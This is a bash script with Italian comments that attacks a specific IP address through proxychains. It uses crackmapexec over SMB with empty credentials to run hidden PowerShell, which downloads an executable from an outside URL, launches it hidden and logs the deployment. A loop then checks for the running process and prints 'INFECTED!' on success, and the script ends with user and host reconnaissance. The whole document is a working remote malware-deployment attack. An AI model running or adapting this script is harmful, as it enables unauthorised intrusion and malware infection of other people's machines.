#!/bin/bash
TARGET="186.57.237.126"
EDGEONE_URL="https://www.directfiles.link/RPUVE0X8H"

# Deploy (stesso)
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
powershell -nop -w hidden -c '
\$wc=New-Object Net.WebClient;
\$wc.Headers.Add(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64)\");
\$wc.DownloadFile(\"$EDGEONE_URL\", \"C:\\Windows\\Temp\\trustedf57.exe\");
Start-Process \"C:\\Windows\\Temp\\trustedf57.exe\" -WindowStyle Hidden;
\"DEPLOYED OK \$((Get-Date))\" | Out-File C:\\Windows\\Temp\\deploy.log -Encoding ascii
'
"

# Monitor FISSO - salva output in file temporaneo
echo "🔍 Inizio monitoraggio (2.5min)..."
for i in {1..30}; do
  echo "[$i/30] Checking..."
  
  # Salva output CME in file temporaneo (evita null bytes)
  proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
    if(Test-Path 'C:\\Windows\\Temp\\trustedf57.exe'){ '✅ FILE EXISTS' } else { '❌ NO FILE' };
    Get-Process | ?{\$_.ProcessName -like '*trusted*'} | select Name,ID,StartTime;
    Get-Content C:\\Windows\\Temp\\deploy.log -ErrorAction SilentlyContinue;
    hostname; whoami
  " 2>/dev/null | tr -d '\000' > /tmp/check_$i.txt  # Rimuovi null bytes
  
  # Leggi file pulito
  if grep -q "✅ FILE EXISTS\|trusted" /tmp/check_$i.txt 2>/dev/null; then
    echo "🎉 INFECTED! $(cat /tmp/check_$i.txt)"
    rm -f /tmp/check_$i.txt
    break
  fi
  
  cat /tmp/check_$i.txt 2>/dev/null || echo "No output"
  rm -f /tmp/check_$i.txt
  sleep 5
done

echo "🏁 FINAL STATUS:"
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
net user; hostname; 
Get-Process | ?{\$_.ProcessName -match 'trustedf57|TRUSTED'};
dir C:\\Windows\\Temp\\trustedf57.exe; 
Get-Content C:\\Windows\\Temp\\deploy.log
" 2>/dev/null | tr -d '\000'
